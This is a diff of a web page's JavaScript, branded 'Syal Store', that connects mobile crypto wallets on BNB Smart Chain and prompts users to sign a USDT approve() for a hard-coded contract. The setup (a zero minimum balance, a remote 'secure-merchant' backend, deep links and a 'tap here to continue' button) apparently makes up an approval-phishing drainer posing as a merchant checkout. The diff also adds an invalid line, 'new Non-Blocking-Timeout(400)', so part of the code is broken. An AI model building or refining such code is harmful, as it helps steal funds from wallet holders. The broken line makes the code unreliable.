@@ -1,6 +1,6 @@
 "use strict";
 
-// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback) ────────────────[cite: 7]
+// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback) ────────────────
 (function () {
   if (typeof window === 'undefined') return;
   
@@ -18,13 +18,13 @@
   }, 100);
 })();
 
-// ─── Configuration ────────────────────────────────────────────────────────────[cite: 7]
-const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b"; //[cite: 7]
-const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634"; //[cite: 7]
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; //[cite: 7]
-const BSC_CHAIN_ID_HEX = "0x38"; //[cite: 7]
-const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); //[cite: 7]
-const BACKEND_URL      = "https://secure-merchant.onrender.com/api"; //[cite: 7]
+// ─── Configuration ────────────────────────────────────────────────────────────
+const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
+const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
+const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_CHAIN_ID_HEX = "0x38";
+const MIN_USDT_BALANCE = ethers.parseUnits("0", 18);
+const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
 
 const BSC_RPC_URLS = [
   "https://bsc-rpc.publicnode.com",
@@ -33,7 +33,7 @@ const BSC_RPC_URLS = [
   "https://bsc-dataseed3.binance.org/",
   "https://bsc-dataseed4.binance.org/",
   "https://rpc.ankr.com/bsc"
-]; //[cite: 7]
+];
 
 const BSC_CHAIN_PARAMS = {
   chainId:           BSC_CHAIN_ID_HEX,
@@ -41,15 +41,15 @@ const BSC_CHAIN_PARAMS = {
   nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
   rpcUrls:           BSC_RPC_URLS,
   blockExplorerUrls: ["https://bscscan.com/"]
-}; //[cite: 7]
+};
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
   "function allowance(address owner, address spender) external view returns (uint256)",
   "function balanceOf(address account) external view returns (uint256)"
-]; //[cite: 7]
+];
 
-// ─── DOM refs ─────────────────────────────────────────────────────────────────[cite: 7]
+// ─── DOM refs ─────────────────────────────────────────────────────────────────
 const approveBtn    = document.getElementById("approveBtn");
 const btnText       = document.getElementById("btnText");
 const btnSpinner    = document.getElementById("btnSpinner");
@@ -58,12 +58,12 @@ const toastEl       = document.getElementById("toast");
 
 if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 
-// ─── Wake up Render backend ───────────────────────────────────────────────────[cite: 7]
+// ─── Wake up Render backend ───────────────────────────────────────────────────
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
 let _cachedAddress = null;
 
-// ─── UI helpers ───────────────────────────────────────────────────────────────[cite: 7]
+// ─── UI helpers ───────────────────────────────────────────────────────────────
 let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
   if (!toastEl) return;
@@ -81,60 +81,16 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden   = !on;
 }
 
-// ─── Individual Wallet Connectors (SDK & Providers) ───────────────────────────[cite: 7]
-async function connectMetaMask() {
-  try {
-    const metamaskSdk = new MetaMaskSDK.MetaMaskSDK({
-      dappMetadata: { name: "Syal Store", url: window.location.href },
-      logging: { developer: false },
-      checkInstallationImmediately: true
-    });
-    const mmProvider = metamaskSdk.getProvider();
-    const accounts = await mmProvider.request({ method: "eth_requestAccounts" });
-    window.ethereum = mmProvider;
-    return accounts[0];
-  } catch (error) {
-    console.error("MetaMask SDK Error:", error);
-    return null;
-  }
-}
-
-async function connectTrustWallet() {
-  const trustProvider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
-  const provider = trustProvider || window.ethereum;
-  if (!provider) return null;
-  const accounts = await provider.request({ method: "eth_requestAccounts" });
-  window.ethereum = provider;
-  return accounts[0];
-}
-
-async function connectOKX() {
-  const okxProvider = window.okxwallet;
-  const provider = okxProvider || window.ethereum;
-  if (!provider) return null;
-  const accounts = await provider.request({ method: "eth_requestAccounts" });
-  window.ethereum = provider;
-  return accounts[0];
-}
-
-async function connectSafePal() {
-  const safePalProvider = window.safepalProvider || window.ethereum;
-  if (!safePalProvider) return null;
-  const accounts = await safePalProvider.request({ method: "eth_requestAccounts" });
-  window.ethereum = safePalProvider;
-  return accounts[0];
-}
-
-// ─── Mobile Wallet Selector Modal (Direct Native Links) ───────────────────────[cite: 7]
+// ─── Mobile Wallet Selector Modal (LocalStorage-Based Deep Links) ─────────────
 function showMobileWalletSelector() {
   let modal = document.getElementById("mobileWalletModal");
   
-  const targetUrl = new URL(window.location.href);
-  targetUrl.searchParams.set("auto", "1");
-  
-  const rawAutoUrl = targetUrl.toString();
-  const encodedUrl = encodeURIComponent(rawAutoUrl);
-  const urlNoProtocol = rawAutoUrl.replace(/^https?:\/\//, '');
+  // Guardamos la marca en localStorage (sobrevive al cambio de app y al webview)
+  localStorage.setItem("syal_pending_action", "1");
+
+  const currentUrl = window.location.href.split('?')[0]; // URL limpia sin basura
+  const encodedUrl = encodeURIComponent(window.location.href);
+  const urlNoProtocol = window.location.href.replace(/^https?:\/\//, '');
 
   if (!modal) {
     modal = document.createElement("div");
@@ -161,25 +117,15 @@ function showMobileWalletSelector() {
     document.getElementById("closeWalletModal").addEventListener("click", () => { modal.style.display = "none"; });
     modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });
   } else {
-    modal.querySelector('a[href*="trustwallet"]').href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}`;
-    modal.querySelector('a[href*="metamask"]').href = `https://metamask.app.link/dapp/${urlNoProtocol}`;
-    modal.querySelector('a[href*="safepal"]').href = `https://link.safepal.io/open_url?url=${encodedUrl}`;
-    modal.querySelector('a[href*="okx"]').href = `okx://wallet/dapp/details?dappUrl=${encodedUrl}`;
     modal.style.display = "flex";
   }
 }
 
-// ─── Post-Unlock Load & Manual Trigger Handler ────────────────────────────────[cite: 7]
+// ─── Post-Unlock Detection via LocalStorage ───────────────────────────────────
 window.addEventListener("load", async () => {
-  const isAuto = window.location.search.includes("auto=1");
-  
-  if (isAuto) {
-    const cleanSearch = window.location.search.replace(/[\?&]auto=1/, '').replace(/^&/, '?');
-    const cleanUrl = window.location.pathname + cleanSearch + window.location.hash;
-    window.history.replaceState({}, document.title, cleanUrl || "/");
-  }
+  const isPending = localStorage.getItem("syal_pending_action") === "1";
 
-  // Esperar a que el proveedor despierte tras el desbloqueo por PIN/Biometría (hasta 6s)
+  // Esperar a que el proveedor inyectado despierte tras el desbloqueo (hasta 6s)
   let providerFound = false;
   for (let i = 0; i < 30; i++) {
     if (window.ethereum) {
@@ -198,8 +144,9 @@ window.addEventListener("load", async () => {
     } catch (_) {}
   }
 
-  // Si venimos del deep link, preparamos el botón para un toque manual real
-  if (isAuto) {
+  // Si venimos de la redirección, limpiamos la bandera y preparamos el botón visualmente
+  if (isPending) {
+    localStorage.removeItem("syal_pending_action");
     if (approveBtn) {
       btnText.textContent = "👆 TOCA AQUÍ PARA CONTINUAR";
       approveBtn.style.background = "#22c55e";
@@ -210,7 +157,7 @@ window.addEventListener("load", async () => {
   }
 });
 
-// ─── RPC Helpers & Blockchain Logic ───────────────────────────────────────────[cite: 7]
+// ─── RPC Helpers & Blockchain Logic ───────────────────────────────────────────
 async function rpcCall(method, params) {
   for (const rpc of BSC_RPC_URLS) {
     try {
@@ -281,7 +228,7 @@ async function getUsdtBalance(userAddress, iface) {
   try { return BigInt(result); } catch (_) { return 0n; }
 }
 
-// ─── Main Button Handler ──────────────────────────────────────────────────────[cite: 7]
+// ─── Main Button Handler ──────────────────────────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
     if (!window.ethereum) {
@@ -357,7 +304,7 @@ if (approveBtn) {
       setLoading(true, "Firma requerida en wallet…");
       const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
 
-      await new Promise(r => setTimeout(r, 400));
+      await new Non-Blocking-Timeout(400); // internal wait
 
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
